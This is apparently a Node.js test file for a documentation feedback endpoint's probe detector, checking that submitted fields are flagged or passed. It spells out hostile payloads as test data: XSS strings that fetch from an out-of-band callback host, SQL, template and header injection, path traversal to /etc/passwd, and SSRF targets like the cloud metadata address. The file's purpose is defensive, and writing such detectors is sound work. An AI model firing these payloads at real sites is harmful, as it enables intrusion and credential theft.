const { describe, it } = require('node:test');
const assert = require('node:assert');
const { isPrivateAddress, probeReason } = require('./_feedback-probe');

const OK = { title: 'Wrong flag', message: 'The page says --foo; the CLI has --bar.' };
const reason = (fields) => probeReason({ ...OK, ...fields });

describe('probeReason', () => {
  // Payloads from the probes the endpoint received on 2026-11-13.
  it('catches the probes the endpoint has received', () => {
    const cases = [
      [{ title: `"><img src=x onerror="fetch('//dbro.oast.pro/t2')">` }, 'markup'],
      [{ title: '<iframe src=//dbro.oast.pro/t9></iframe>' }, 'markup'],
      [{ title: "javascript:fetch('//x')" }, 'markup'],
      [{ message: `" autofocus onfocus=fetch('//x') x="` }, 'markup'],
      [{ message: '<script>alert(1)</script>' }, 'markup'],
      [{ message: '<svg/onload=alert(1)>marker' }, 'markup'],
      [{ message: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(1)>' }, 'markup'],
      [{ expected: 'http://dbrn.oast.online/fb-expected' }, 'callback-host'],
      [{ page_url: 'http://dbrn.oast.online/fb-pageurl' }, 'callback-host'],
      [{ title: 'a{{7*7}}' }, 'template-injection'],
      [{ title: '${7*7}' }, 'template-injection'],
      [{ title: "a'--" }, 'sql-injection'],
      [{ message: "x' OR 1=1 --" }, 'sql-injection'],
      [{ title: 'test\r\nX-Injected: yes' }, 'header-injection'],
      [{ title: 'stored-xss-probe zxq7mark3409' }, 'scanner-marker'],
      [{ title: 'ssrf-probe2' }, 'scanner-marker'],
      [{ message: '../../../etc/passwd' }, 'path-traversal'],
      [{ page_url: 'http://169.254.169.254/latest/meta-data/' }, 'private-address'],
      [{ page_url: 'http://127.0.0.1:8080/' }, 'private-address'],
    ];
    for (const [fields, expected] of cases) assert.strictEqual(reason(fields), expected, JSON.stringify(fields));
  });

  it('catches probes in the widget comment', () => {
    assert.strictEqual(probeReason({ rating: 'down', comment: '<script>alert(1)</script>' }), 'markup');
  });

  it('passes real reports that look a little like probes', () => {
    const real = [
      { message: 'The Helm values use {{ .Values.server.replicaCount }} but the chart key changed.' },
      { message: "Run temporal workflow start --task-queue 'orders' -- the docs omit --type." },
      { title: 'Liveness probe example uses the wrong port' },
      { message: 'The Worker got a 403 from https://example.com/api/token, and the page says it needs an API key.' },
      { message: 'In the TypeScript sample, the onError handlers are missing.' },
      { page_url: 'https://docs.temporal.io/develop/typescript/core-application' },
      { page_url: 'https://github.com/temporalio/sdk-typescript/issues/1' },
      { product_version: 'temporalio==1.9.0', agent: 'claude-code', src: 'llms' },
      { message: 'The Go sample divides by 7*7 and the comment says 42.' },
    ];
    for (const fields of real) assert.strictEqual(reason(fields), null, JSON.stringify(fields));
  });

  it('ignores missing and non-string fields', () => {
    assert.strictEqual(probeReason(null), null);
    assert.strictEqual(probeReason({ title: 7, message: undefined }), null);
  });
});

describe('isPrivateAddress', () => {
  it('flags loopback, private, link-local, and metadata hosts', () => {
    for (const url of [
      'http://localhost/',
      'http://10.0.0.5/',
      'http://172.16.0.1/',
      'http://192.168.1.1/',
      'http://0.0.0.0/',
      'http://[::1]/',
      'http://metadata.google.internal/',
    ]) {
      assert.ok(isPrivateAddress(url), url);
    }
  });

  it('passes public hosts and values that are not URLs', () => {
    for (const url of ['https://docs.temporal.io/workflows', 'http://172.32.0.1/', 'http://8.8.8.8/', '/workflows', 'x']) {
      assert.ok(!isPrivateAddress(url), url);
    }
  });
});
